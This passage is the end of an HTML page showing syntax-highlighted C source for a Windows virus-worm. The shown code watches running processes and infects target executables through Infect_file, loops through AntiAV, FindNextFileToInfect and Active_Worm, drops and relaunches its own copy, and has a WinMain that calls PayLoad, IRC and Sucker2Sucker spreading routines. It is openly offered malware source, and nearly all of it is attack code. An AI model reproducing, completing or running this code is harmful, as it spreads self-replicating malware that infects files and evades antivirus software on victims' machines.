    </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">Process32Next</span><span class="sc10">(</span><span class="sc11">hsnp</span><span class="sc10">,&amp;</span><span class="sc11">stproc</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hsnp</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">my_Target</span><span class="sc10">)==</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">IsProcessExist</span><span class="sc10">(</span><span class="sc11">my_Target</span><span class="sc10">)==</span><span class="sc11">TRUE</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">Start</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">Start2</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">hsnp</span><span class="sc10">=</span><span class="sc11">CreateToolhelp32Snapshot</span><span class="sc10">(</span><span class="sc11">TH32CS_SNAPPROCESS</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">Process32First</span><span class="sc10">(</span><span class="sc11">hsnp</span><span class="sc10">,&amp;</span><span class="sc11">stproc</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">do</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">SleepEx</span><span class="sc10">(</span><span class="sc4">10</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">stproc</span><span class="sc10">.</span><span class="sc11">szExeFile</span><span class="sc10">,</span><span class="sc11">my_Target</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">found_it</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">stproc</span><span class="sc10">.</span><span class="sc11">szExeFile</span><span class="sc10">,</span><span class="sc11">my_Target</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">found_it</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">Process32Next</span><span class="sc10">(</span><span class="sc11">hsnp</span><span class="sc10">,&amp;</span><span class="sc11">stproc</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hsnp</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">found_it</span><span class="sc10">==</span><span class="sc11">TRUE</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">my_Target</span><span class="sc10">)==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">Start2</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IsInfectable</span><span class="sc10">(</span><span class="sc11">my_Target</span><span class="sc10">)==</span><span class="sc11">TRUE</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc2">//  MessageBox(NULL,my_Target,"Debug:Virus Catch File",MB_OK);
</span><span class="sc0">    </span><span class="sc11">Infect_file</span><span class="sc10">(</span><span class="sc11">VirusPath</span><span class="sc10">,</span><span class="sc11">my_Target</span><span class="sc10">,</span><span class="sc6">"Ml"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">TSR_Mode</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">VirusTempFile</span><span class="sc10">,</span><span class="sc11">VirusPath</span><span class="sc10">)==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">ProcFindAll</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;=</span><span class="sc4">2</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">AntiAV</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">FindNextFileToInfect</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">Position</span><span class="sc10">==</span><span class="sc4">149</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc11">ExitProcess</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">Position</span><span class="sc10">!=</span><span class="sc4">149</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">Active_Worm</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">SleepEx</span><span class="sc10">(</span><span class="sc4">10000</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">TSR_Mode</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">GoTSR</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">VirusTempFile</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">GetFileAttributes</span><span class="sc10">(</span><span class="sc11">VirusTempFile</span><span class="sc10">)==-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">write_virus</span><span class="sc10">(</span><span class="sc11">VirusPath</span><span class="sc10">,</span><span class="sc11">VirusTempFile</span><span class="sc10">,</span><span class="sc11">virus_size</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">SleepEx</span><span class="sc10">(</span><span class="sc4">500</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">ShellExecute</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc6">"open"</span><span class="sc10">,</span><span class="sc11">VirusTempFile</span><span class="sc10">,</span><span class="sc6">""</span><span class="sc10">,</span><span class="sc6">""</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc1">/*----------------------[Main Function]--------------------*/</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">APIENTRY</span><span class="sc0"> </span><span class="sc11">WinMain</span><span class="sc10">(</span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hInstance</span><span class="sc10">,</span><span class="sc0">
                     </span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hPrevInstance</span><span class="sc10">,</span><span class="sc0">
                     </span><span class="sc11">LPSTR</span><span class="sc0">     </span><span class="sc11">lpCmdLine</span><span class="sc10">,</span><span class="sc0">
                     </span><span class="sc16">int</span><span class="sc0">       </span><span class="sc11">nCmdShow</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">InitVirus</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc11">PayLoad</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc11">GoTSR</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc11">Run_Infected_File</span><span class="sc10">(</span><span class="sc11">VirusPath</span><span class="sc10">,</span><span class="sc11">VirusParameters</span><span class="sc10">,</span><span class="sc11">virus_size</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">IRC</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc11">Sucker2Sucker</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hPrevInstance</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">ExitProcess</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">TSR_Mode</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
